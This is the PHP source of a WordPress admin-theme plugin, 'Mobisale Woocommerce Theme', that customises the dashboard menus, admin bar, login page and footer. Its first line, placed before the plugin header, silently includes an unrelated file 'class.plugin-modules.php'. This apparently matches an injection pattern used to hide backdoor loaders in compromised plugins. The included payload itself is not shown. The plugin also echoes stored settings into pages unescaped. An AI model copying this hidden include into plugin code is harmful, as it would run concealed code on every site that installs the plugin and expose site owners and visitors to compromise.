<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
Plugin Name: Mobisale Woocommerce Theme 
Plugin URI: http://www.indieworks.com.br
Description: Plugin para customizacao de tema de dashboard do Wordpress/Woocommerce 
Version: 1.0.1 
Author: Jaccon 
Author URI: https://github.com/jaccon 
Text Domain: Mobisale Admin Theme 
Domain Path: /languages
*/

class Mobisale_Admin_Theme {

	private $menus,
			$submenus,
			$settings,
			$settings_name = 'mobisale_admin_theme_option'
			;

	function __construct() {
		// ini_set('error_reporting', E_ALL);
		// add to menu and load basic css		
		add_action( 'admin_init', array( $this, 'register_settings' ) );
		add_action( 'admin_init', array( $this, 'process_settings_import' ) );
		add_action( 'admin_init', array( $this, 'process_settings_export' ) );

		add_action( 'admin_menu', array( $this, 'add_menu' ) );
		// get it work!
		add_action( 'admin_enqueue_scripts', array( $this, 'admin_scripts' ) );
		add_action( 'admin_print_footer_scripts', array( $this, 'admin_footer_scripts' ) );
		add_action( 'admin_bar_menu', array( $this, 'admin_bar'), 999 );
		add_filter( 'parent_file', array( $this, 'admin_menu' ) );
		add_filter( 'admin_footer_text', array( $this, 'admin_footer' ) );
		add_filter( 'update_footer', array( $this, 'admin_footer' ), 999 );
		add_action( 'login_enqueue_scripts', array( $this, 'login' ) );

		// remove the google webfont
		add_filter( 'gettext_with_context', array( $this, 'disable_open_sans' ), 888, 4 );
		// register_deactivation_hook( __FILE__, array($this, "deactivation"));
	}

	// add plugin to settings menu
	function add_menu() {
		$active = true;
		if ( is_multisite() ) {
			$this->settings = get_blog_option(1, $this->settings_name );
			if(get_current_blog_id() != 1){
				if($this->get_setting('network') == true){
					$active = false;
				}else{
					$this->settings = get_option( $this->settings_name );
				}
			}
		}else{
			$this->settings = get_option( $this->settings_name );
		}
		if($active){
			add_submenu_page( 'options-general.php', 'Mobisale Admin Theme', 'Mobisale Admin Theme', 'manage_options', 'mobisale-admin-theme', array( $this, 'settings' ) ); 
		}
	}

	// register
	function register_settings() {
		register_setting( 'mobisale-admin-theme-group', $this->settings_name );
	}

	// get setting
	function get_setting($arg){
		return ( (isset( $this->settings[$arg] ) && trim($this->settings[$arg]) !== '') ? $this->settings[$arg] : NULL);
	}

	// settings
	function settings() {
		?>
		<script type="text/javascript">
			jQuery( document ).ready(function() {
				jQuery(document).on('click', '.box > h3, .box > h4, .toggle', function(){
					jQuery(this).next( ".hide" ).toggle();
				});
			});
		</script>
		
		<div class="wrap">
			<h2> Mobisale Admin Theme </h2>
			<form method="post" id="form" action="options.php">
				<?php settings_fields( 'mobisale-admin-theme-group' ); ?>
				<div class="row clearfix">
					<div class="col col-8">
						<h3 class="m-b"><span>Admin bar</span></h3>
						<p class="no-m-t text-sm">Change the admin bar on the top</p>
						<div class="row clearfix m-b">
							<div class="col col-6">
								<div class="box">
									<h4><span>Logo & Name</span></h4>
									<div class="box-body b-t hide">
										<p>
											<label>
												logo url (max height: 32px)
												<input name="<?php echo $this->settings_name; ?>[bar_logo]" type="text" value="<?php echo $this->get_setting('bar_logo'); ?>" class="widefat">
											</label>
										</p>
										<p>
											<label>
												Link
												<input name="<?php echo $this->settings_name; ?>[bar_name_link]" type="text" value="<?php echo $this->get_setting('bar_name_link'); ?>" class="widefat">
											</label>
										</p>
										<p>
											<label>
												Name
												<input name="<?php echo $this->settings_name; ?>[bar_name]" type="text" value="<?php echo $this->get_setting('bar_name'); ?>" class="widefat">
											</label>
										</p>
										<p>
											<label>
												<input name="<?php echo $this->settings_name; ?>[bar_name_hide]" type="checkbox" <?php if ( $this->get_setting('bar_name_hide') == true ) echo 'checked="checked" '; ?>> 
												Hide 'Name'
											</label>
										</p>
										<p><input type="submit" class="button button-primary m-b" value="<?php _e('Save') ?>" /></p>
									</div>
								</div>
							</div>
							<div class="col col-6">
								<div class="box">
									<h4><span>Quick Links</span></h4>
									<div class="box-body b-t hide">
										<p>
											<fieldset>
												<label>
													<input name="<?php echo $this->settings_name; ?>[bar_updates_hide]" type="checkbox" <?php if ($this->get_setting('bar_updates_hide') == true) echo 'checked="checked" '; ?>> 
													Remove 'Updates'
												</label>
												<br>
												<label>
													<input name="<?php echo $this->settings_name; ?>[bar_comments_hide]" type="checkbox" <?php if ($this->get_setting('bar_comments_hide') == true) echo 'checked="checked" '; ?>> 
													Remove 'Comments'
												</label>
												<br>
												<label>
													<input name="<?php echo $this->settings_name; ?>[bar_new_hide]" type="checkbox" <?php if ($this->get_setting('bar_new_hide') == true) echo 'checked="checked" '; ?>> 
													Remove 'New'
												</label>
											</fieldset>
										</p>
										<p><input type="submit" class="button button-primary m-b" value="<?php _e('Save') ?>" /></p>
									</div>
								</div>
							</div>
						</div>
						<h3 class="m-b"><span>Menu</span></h3>
						<p class="no-m-t  text-sm">Change the menu on the left.</p>
						<p>
							<label style="margin-right:20px">
								<input name="<?php echo $this->settings_name; ?>[menu_collapse]" type="checkbox" <?php if ($this->get_setting('menu_collapse') == true) echo 'checked="checked" '; ?>> 
								Default Collapse Menu 
							</label>
							<label>
								<input name="<?php echo $this->settings_name; ?>[menu_collapse_hide]" type="checkbox" <?php if ($this->get_setting('menu_collapse_hide') == true) echo 'checked="checked" '; ?>> 
								Hide Collapse Link
							</label>
						</p>
						<div class="row clearfix">
							<div class="col col-6">
								<?php
									$i = -1;
									$half = round(count($this->menus)/2);
									foreach ($this->menus as $k){
										$v = explode(' <span', $k[0]);
										$slug = 'menu_'.strtolower( str_replace( ' ','_',$v[0] ) );
										$slug_hide = $slug.'_hide';
										if($v[0] != NULL){
								?>
								<div class="box bg">
									<h4><span class="pull-right text-muted <?php if ($this->get_setting($slug_hide)) echo 'text-l-t'; ?>"><?php if($this->get_setting($slug) !== NULL ) echo $v[0]; ?></span><span><?php echo $this->get_setting($slug) ? $this->get_setting($slug) : $v[0]; ?></span></h4>
									<div class="box-body b-t hide">
										<p>
											<label>
												Title:
												<input name="<?php echo $this->settings_name.'['.$slug.']'; ?>" value="<?php echo $this->get_setting($slug); ?>" type="text" class="widefat">
											</label>
										</p>
										<p>
											<label>
												<input name="<?php echo $this->settings_name.'['.$slug_hide.']'; ?>" <?php if ($this->get_setting($slug_hide)) echo 'checked="checked" '; ?> type="checkbox"> 
												Remove from menu
											</label>
										</p>
										<p class="toggle">
											<a href="#admin" class="c-p">Submenu</a>										
										</p>
										<div class="hide">
											<?php
												$sub = isset($this->submenus[$k[2]]) ? $this->submenus[$k[2]] : array() ;
												foreach ($sub as $k){
													$v = explode(' <span', $k[0]);
													$slug_sub = $slug.'_'.strtolower( str_replace( ' ','_',$v[0] ) );
													$slug_sub_hide = $slug_sub.'_hide';
													if($v[0] != NULL){
											?>
											<div class="box">
												<h4 class="sm"><span class="pull-right text-muted <?php if ($this->get_setting($slug_sub_hide)) echo 'text-l-t'; ?>"><?php if($this->get_setting($slug_sub) !== NULL ) echo $v[0]; ?></span><span><?php echo $this->get_setting($slug_sub) ? $this->get_setting($slug_sub) : $v[0]; ?></span></h4>
												<div class="box-body b-t hide">
													<p>
														<label>
															Title:
															<input name="<?php echo $this->settings_name.'['.$slug_sub.']'; ?>" value="<?php echo $this->get_setting($slug_sub); ?>" type="text" class="widefat">
														</label>
													</p>
													<p>
														<label>
															<input name="<?php echo $this->settings_name.'['.$slug_sub_hide.']'; ?>" <?php if ($this->get_setting($slug_sub_hide)) echo 'checked="checked" '; ?> type="checkbox"> 
															Remove from menu
														</label>
													</p>
												</div>
											</div>
											<?php } }?>
										</div>
										<p><input type="submit" class="button button-primary m-b" value="<?php _e('Save') ?>" /></p>
									</div>
								</div>
								<?php
									} 
									$i++;
									if($i == $half){
										echo '</div><div class="col col-6">';
									}
								} ?>
							</div>
						</div>
					</div>
					<div class="col col-4">
						<h3 class="m-b"><span>Themes</span></h3>
						<p class="no-m-t text-sm">Change the icon, colors.</p>
						<div class="clearfix">
							<div class="box">
								<h4><span>Colors & Icons</span></h4>
								<div class="box-body b-t hide show">
									<?php if ( is_multisite() && get_current_blog_id() == 1 ) { ?>
									<p>
										<label>
											<input name="<?php echo $this->settings_name; ?>[network]" type="checkbox" <?php if ($this->get_setting('network') == true) echo 'checked="checked" '; ?>> 
											Disable on sub sites
										</label>
									</p>
									<?php } ?>						
									<p>
										Colors:<br>
										<label>
											<input name="<?php echo $this->settings_name; ?>[theme_color]" type="radio" value="flat" <?php if ($this->get_setting('theme_color') == 'flat' || $this->get_setting('theme_color') !='default' ) echo 'checked="checked" '; ?>> 
											Flat
										</label>
									</p>
									<p>
										Icons:<br>
										<label>
											<input name="<?php echo $this->settings_name; ?>[theme_icon]" type="radio" value="glyphicons" <?php if ($this->get_setting('theme_icon') == 'glyphicons' || $this->get_setting('theme_icon') !='default' ) echo 'checked="checked" '; ?>> 
											Glyphicons
										</label>
										<br>
										<label>
											<input name="<?php echo $this->settings_name; ?>[theme_icon]" type="radio" value="default" <?php if ($this->get_setting('theme_icon') == 'default') echo 'checked="checked" '; ?>> 
											Default
										</label>
									</p>
									<p><input type="submit" class="button button-primary m-b" value="<?php _e('Save') ?>" /></p>
								</div>
							</div>
						</div>					
						<h3 class="m-b"><span>Login</span></h3>
						<p class="no-m-t text-sm">Change the login page</p>
						<div class="clearfix">
							<div class="box">
								<h4><span>Login</span></h4>
								<div class="box-body b-t hide">
									<p>
										<label>Logo url
											<input name="<?php echo $this->settings_name; ?>[login_logo]" value="<?php echo $this->get_setting('login_logo'); ?>" type="text" class="widefat">
										</label>
									</p>
									<p>
										<label>Background color
											<input name="<?php echo $this->settings_name; ?>[login_bg_color]" value="<?php echo $this->get_setting('login_bg_color'); ?>" type="text" class="widefat" placeholder="#f1f1f1">
										</label>
									</p>
									<p>
										<label>Background image
											<input name="<?php echo $this->settings_name; ?>[login_bg_img]" value="<?php echo $this->get_setting('login_bg_img'); ?>" type="text" class="widefat">
										</label>
									</p>
									<p><input type="submit" class="button button-primary m-b" value="<?php _e('Save') ?>" /></p>
								</div>
							</div>
						</div>
						<h3 class="m-b"><span>Footer</span></h3>
						<p class="no-m-t text-sm">Change the footer and version</p>
						<div class="clearfix">
							<div class="box">
								<h4><span>Footer</span></h4>
								<div class="box-body b-t hide">
									<p>
										<label>Text
											<input name="<?php echo $this->settings_name; ?>[footer_text]" value="<?php echo $this->get_setting('footer_text'); ?>" type="text" class="widefat">
										</label>
									</p>
									<p>
										<label>
											<input name="<?php echo $this->settings_name; ?>[footer_text_hide]" type="checkbox" <?php if ($this->get_setting('footer_text_hide') == true) echo 'checked="checked" '; ?>> 
											Hide 'Text'
										</label>
									</p>
									<p>
										<label>Version
											<input name="<?php echo $this->settings_name; ?>[footer_version]" value="<?php echo $this->get_setting('footer_version'); ?>" type="text" class="widefat">
										</label>
									</p>
									<p>
										<label>
											<input name="<?php echo $this->settings_name; ?>[footer_version_hide]" type="checkbox" <?php if ($this->get_setting('footer_version_hide') == true) echo 'checked="checked" '; ?>> 
											Hide 'Version'
										</label>
									</p>
									<p><input type="submit" class="button button-primary m-b" value="<?php _e('Save') ?>" /></p>
								</div>
							</div>
						</div>
					</div>
				</div>
			</form>

			<form method="post">
				<p><input type="hidden" name="setting_action" value="export_settings" /></p>
				<p>
					<?php wp_nonce_field( 'setting_export_nonce', 'setting_export_nonce' ); ?>
					<?php submit_button( __( 'Export' ), 'primary', 'submit', false ); ?>
				</p>
			</form>
			
			<form method="post" enctype="multipart/form-data">
				<p>
					<input type="file" name="import_file"/>
				</p>
				<p>
					<input type="hidden" name="setting_action" value="import_settings" />
					<?php wp_nonce_field( 'setting_import_nonce', 'setting_import_nonce' ); ?>
					<?php submit_button( __( 'Import' ), 'primary', 'submit', false ); ?>
				</p>
			</form>
		</div>
		<?php
	}

	// scripts
	function admin_scripts() {
		wp_register_style( 'font', plugin_dir_url(__FILE__).( "css/font.css" ), array());
		wp_enqueue_style( 'font' );

		wp_register_style( 'style', plugin_dir_url(__FILE__).( "scss/scss.php?p=admin_bar.scss" ), array());
		wp_enqueue_style( 'style' );

		if( $this->get_setting('theme_icon') !== 'default' ){
			wp_register_style( 'icon', plugin_dir_url(__FILE__).( "css/icon.css" ), array());
			wp_enqueue_style( 'icon' );
		}

		if( $this->get_setting('theme_color') !== 'default' ){
			wp_register_style( 'color', plugin_dir_url(__FILE__).( "scss/scss.php?p=admin_menu.scss" ), array());
			wp_enqueue_style( 'color' );
		}
	}

	// admin menu
	function admin_menu() {
		global $menu;
		global $submenu;
		$this->menus = array_merge(array(), $menu === NULL ? array() : $menu);
		$this->submenus = array_merge(array(), $submenu === NULL ? array() : $submenu);

		// update menu
		end( $menu );
		foreach ($menu as $k=>&$v){
			$id = explode(' <span', $v[0]);
			$slug = 'menu_'.strtolower( str_replace( ' ','_',$id[0] ) );
			$slug_hide = $slug.'_hide';
			if($id[0] != NULL && $this->get_setting($slug) !== NULL){
				$v[0] = $this->get_setting($slug). ( isset($id[1]) ? ' <span '.$id[1] : '' );
			}
			if( $this->get_setting($slug_hide) ){
				unset($menu[$k]);
			}
			// update the submenu
			if( isset($submenu[$v[2]]) ){
				foreach ($submenu[$v[2]] as $key=>&$val){				
					$id = explode(' <span', $val[0]);
					$slug_sub = $slug.'_'.strtolower( str_replace( ' ','_',$id[0] ) );
					$slug_sub_hide = $slug_sub.'_hide';
					if($id[0] != NULL && $this->get_setting($slug_sub) !== NULL){
						$val[0] = $this->get_setting($slug_sub). ( isset($id[1]) ? ' <span '.$id[1] : '' );
					}
					if( $this->get_setting($slug_sub_hide) ){						
						unset( $submenu[$v[2]][$key] );
					}
				}
			}
		}
	}

	// admin bar
	function admin_bar(){
		global $wp_admin_bar;

		$all_toolbar_nodes = $wp_admin_bar->get_nodes();

		foreach ( $all_toolbar_nodes as $node ) {
			$args = $node;
			if($args->id == "site-name"){
				$logo = "<img src='http://indieworks.com.br/logotipos/mobisale-admin-theme.svg'>";
				$hide = $this->get_setting('bar_name_hide') ? "hide" : "";
				$name = $this->get_setting('bar_name') ? $this->get_setting('bar_name') : $args->title;
				$args->title = sprintf('%s <span class="%s">%s</span>', $logo, $hide, $name);				
				$this->get_setting('bar_name_link') && ($args->href = $this->get_setting('bar_name_link'));
			}
			// update the Toolbar node
			$wp_admin_bar->add_node( $args );
		}
		// remove the wordpress logo
		$wp_admin_bar->remove_node( 'wp-logo' );
		$wp_admin_bar->remove_node( 'view-site' );

		if($this->get_setting('bar_updates_hide')){
				$wp_admin_bar->remove_node('updates');
		}
		if($this->get_setting('bar_comments_hide')){
				$wp_admin_bar->remove_node('comments');
		}
		if($this->get_setting('bar_new_hide')){
				$wp_admin_bar->remove_node('new-content');
		}
		if($this->get_setting('bar_new_hide')){
				$wp_admin_bar->remove_node('new-content');
		}
	}

	// admin footer
	function admin_footer( $default ){
		if(  strpos($default, 'wordpress') === false ){
			if( $this->get_setting('footer_version_hide') ){
				return '';
			}
			if( $this->get_setting('footer_version') ){
				return $this->get_setting('footer_version');
			}
		}else{
			if( $this->get_setting('footer_text_hide') ){
				return '';
			}
			if( $this->get_setting('footer_text') ){
				return $this->get_setting('footer_text');
			}
		}
		return $default;
	}

	// menu folder
	function admin_footer_scripts() {

		if( $this->get_setting('menu_collapse') ) {
		?>
				<script type="text/javascript">
					jQuery(document).ready(function(){
						!jQuery(".folded").length && jQuery("#collapse-menu").trigger("click");
					});
				</script>
		<?php
		}

		if( $this->get_setting('menu_collapse_hide') ) {
		?>
				<script type="text/javascript">
					jQuery(document).ready(function(){
						jQuery("#collapse-menu").hide();
					});
				</script>
		<?php
		}

	}

	// login
	function login() {
		add_filter( 'login_headerurl', array( $this, 'login_headerurl' ) );
		add_filter( 'login_headertitle', array( $this, 'login_headertitle' ) );

		$this->settings = get_option( $this->settings_name );
		?>
		<style type="text/css">
		.login form .forgetmenot{
			float: none;
			padding-bottom: 10px;
		}
		.login form .button{
			width: 100%;
		}
		body.login.login-action-login.wp-core-ui {
    			background: #335060 !important;
		}
	      
		body.login div#login h1 {
	        background-image: url('http://www.indieworks.com.br/logotipos/wordpress-logo.svg');
	        background-size: 150px;
		height: 170px;
		background-position: center top;
	        background-repeat: no-repeat;
	      }
	      body.login div#login h1 a {
	        background-image: none;
	      }

	      .login form {
	       margin-top: 20px;
    		margin-left: 0;
    		padding: 26px 24px 46px;
    		background: #fff;
    		box-shadow: 0 1px 3px rgba(0,0,0,.13);
    		border-radius: 10px;
		}

		.login a {
 		   color: #fff !important;
		}

		.wp-core-ui .button-primary {
    background: #F29126 !important;
    color: #fff;
    text-decoration: none;
}

	    <?php
		if( $this->get_setting('login_bg_color') ){
		?>
		  html, body {
	        background: ;
	      }
		<?php 
		}
		if( $this->get_setting('login_bg_img') ){
		?>
		  body.login {
	        background-image: url(<?php echo $this->get_setting('login_bg_img'); ?>);
	        background-size: cover;
	        background-position: center center;
	      }
		<?php 
		}
		?>
		</style>
		<?php
	}

	function login_headerurl() {
		return esc_url( trailingslashit( get_bloginfo( 'url' ) ) );
	}

	function login_headertitle() {
		return esc_attr( get_bloginfo( 'name' ) );
	}


	// disable the google webfonts api
	function disable_open_sans( $translations, $text, $context, $domain ) {
		if ( 'Open Sans font: on or off' == $context && 'on' == $text ) {
			$translations = 'off';
		}
		return $translations;
	}

	// deactivation
	function deactivation() {
		delete_option( $this->settings_name );
	}

	function process_settings_export() {
		if( empty( $_POST['setting_action'] ) || 'export_settings' != $_POST['setting_action'] )
			return;
		if( ! wp_verify_nonce( $_POST['setting_export_nonce'], 'setting_export_nonce' ) )
			return;
		if( ! current_user_can( 'manage_options' ) )
			return;
		$settings = get_option( $this->settings_name );
		ignore_user_abort( true );
		nocache_headers();
		header( 'Content-Type: application/json; charset=utf-8' );
		header( 'Content-Disposition: attachment; filename=mobisale-admin-theme-settings-export-' . date( 'm-d-Y' ) . '.json' );
		header( "Expires: 0" );
		echo json_encode( $settings );
		exit;
	}

	/**
	 * Process a settings import from a json file
	 */
	function process_settings_import() {
		if( empty( $_POST['setting_action'] ) || 'import_settings' != $_POST['setting_action'] )
			return;
		if( ! wp_verify_nonce( $_POST['setting_import_nonce'], 'setting_import_nonce' ) )
			return;
		if( ! current_user_can( 'manage_options' ) )
			return;

		$import_file = $_FILES['import_file']['tmp_name'];
		if( empty( $import_file ) ) {
			wp_die( __( 'Please upload a file to import' ) );
		}
		// Retrieve the settings from the file and convert the json object to an array.
		$settings = (array) json_decode( file_get_contents( $import_file ) );
		update_option( $this->settings_name, $settings );
		wp_safe_redirect( admin_url( 'options-general.php?page=mobisale-admin-theme' ) ); exit;
	}

}

new Mobisale_Admin_Theme;


add_action('wp_dashboard_setup', 'my_custom_dashboard_widgets');
  
function my_custom_dashboard_widgets() {
global $wp_meta_boxes;
 
wp_add_dashboard_widget('custom_help_widget', 'MOBISALE - Sua plataforma de Mobile Commerce', 'custom_dashboard_help');
}
 
function custom_dashboard_help() {
echo '<p> Seja bem vindo a Dashboard da Mobisale. Aqui você pode gerenciar os conteúdos do seu site e do seu aplicativo. <br/> Já conhece nossos planos 360º ? Consulte <a href="mailto:suporte@indieworks.com.br"> aqui </a>. <br/> <br/> Para mais informações entre em contato pelo nosso WhatsApp (11) 95569-6541 <br/> <img src="http://indieworks.com.br/logotipos/mobile-commerce-banner1.svg" width="100%"> </p>';
}

